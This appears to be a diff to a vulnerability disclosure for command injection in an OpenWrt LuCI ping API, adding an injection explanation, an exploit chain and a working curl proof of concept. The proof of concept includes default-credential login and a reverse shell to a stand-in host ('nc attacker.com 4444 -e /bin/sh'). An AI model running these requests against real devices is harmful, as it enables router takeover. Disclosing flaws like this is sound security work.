@@ -122,11 +122,106 @@ Expected API behavior:
 
 The API can return `0` because the `ping` operation fails, while the command substitution has already executed.
 
-![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785226220464-c88fef6e-50e4-4c9b-b96e-2723e5673f03.png?x-oss-process=image%2Fformat%2Cwebp)
-
 ## Impact
 
 An authenticated attacker can execute arbitrary shell commands through the network diagnostic ping API. The command runs in the web management execution context, which is typically highly privileged on OpenWrt-based firmware.
 
+## Injection Principle
 
+Normal request:
 
+```text
+url = "192.168.1.1"
+```
+
+Concatenated command:
+
+```sh
+ping 192.168.1.1 -c 1 -W 1 |grep avg
+```
+
+Injection request:
+
+```text
+url = "$(touch /tmp/vuln32)"
+```
+
+Concatenated command:
+
+```sh
+ping $(touch /tmp/vuln32) -c 1 -W 1 |grep avg
+```
+
+Shell execution flow:
+
+1. `$()` command substitution executes first: `touch /tmp/vuln32` → file created
+2. `touch` returns an empty string
+3. `ping` has no valid host argument → fails
+4. But the injected command has already executed
+
+Why `$()` instead of `;`:
+
+```text
+Using ";touch /tmp/vuln32":
+  → ping ;touch /tmp/vuln32 -c 1 -W 1 |grep avg
+  → Command 1: ping (no argument, reads from stdin, hangs)
+  → Command 2 never executes (ping blocks)
+
+Using "$()" command substitution:
+  → ping $(touch /tmp/vuln32) -c 1 -W 1 |grep avg
+  → $() executes first, touch completes immediately
+  → ping fails but does not hang
+```
+
+## Exploit Chain
+
+```text
+Attacker
+  │
+  ├─ Step 1: Obtain root credentials
+  │
+  ├─ Step 2: Construct HTTP POST request
+  │           URL:  /cgi-bin/luci/;stok=<STOK>/api/ZRnetwork/ping
+  │           Body: url=$(<COMMAND>)
+  │
+  ├─ Step 3: LuciUtil.execl() executes via io.popen() → /bin/sh
+  │           Command inside $() executes before ping
+  │
+  └─ Step 4: Command execution completes, API returns {"link": 0}
+```
+
+## Proof of Concept
+
+```bash
+# Obtain session token
+curl -s --noproxy "*" -c cookies.txt -X POST \
+  "http://192.168.18.1/cgi-bin/luci" \
+  -d "username=root&password=admin" -L -D headers.txt
+
+STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')
+
+# PoC 1: Create file
+curl -s --noproxy "*" -b cookies.txt -X POST \
+  --data-urlencode 'url=$(touch /tmp/vuln32)' \
+  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/ping"
+
+# PoC 2: Execute arbitrary command and write result
+curl -s --noproxy "*" -b cookies.txt -X POST \
+  --data-urlencode 'url=$(id>/tmp/vuln32_id)' \
+  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/ping"
+
+# PoC 3: Reverse shell
+curl -s --noproxy "*" -b cookies.txt -X POST \
+  --data-urlencode 'url=$(nc attacker.com 4444 -e /bin/sh)' \
+  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/ping"
+```
+
+## Real Device Verification
+
+```text
+Request:  POST /api/ZRnetwork/ping  url=$(touch /tmp/vuln32)
+Response: { "link": 0 }
+SSH verification: -rw-r--r-- 1 root root 0 Jul 28 15:48 /tmp/vuln32  ✅
+```
+
+![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785226220464-c88fef6e-50e4-4c9b-b96e-2723e5673f03.png?x-oss-process=image%2Fformat%2Cwebp)
